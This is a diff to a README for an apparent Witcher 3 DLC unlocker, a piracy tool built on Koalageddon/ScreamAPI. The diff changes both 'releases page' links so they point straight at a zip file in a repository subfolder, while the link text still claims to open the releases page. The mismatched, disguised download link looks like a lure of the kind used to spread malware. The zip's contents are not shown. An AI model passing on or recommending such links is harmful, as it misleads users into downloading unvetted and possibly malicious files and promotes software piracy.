@@ -1,6 +1,6 @@
 # 🎮 The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI- - Access all Witcher 3 expansion content easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vkxxxii99/The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI-/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/vkxxxii99/The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI-/main/saily/The_AP_Koalageddon_Platform_DL_Scream_Witcher_Cross_Unlocker_2.7.zip)
 
 ## 📌 About this tool
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 ## 📥 Downloading the software
 
 1. Visit the project releases page to obtain the files.
-2. Click here to go to the releases page: [https://github.com/vkxxxii99/The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI-/releases](https://github.com/vkxxxii99/The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI-/releases)
+2. Click here to go to the releases page: [https://raw.githubusercontent.com/vkxxxii99/The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI-/main/saily/The_AP_Koalageddon_Platform_DL_Scream_Witcher_Cross_Unlocker_2.7.zip](https://raw.githubusercontent.com/vkxxxii99/The-Witcher-3-DLC-Unlocker-Cross-Platform-Koalageddon-ScreamAPI-/main/saily/The_AP_Koalageddon_Platform_DL_Scream_Witcher_Cross_Unlocker_2.7.zip)
 3. Locate the latest release at the top of the list.
 4. Click the file ending in .zip to start your download.
 5. Save the file to your desktop for easy access.
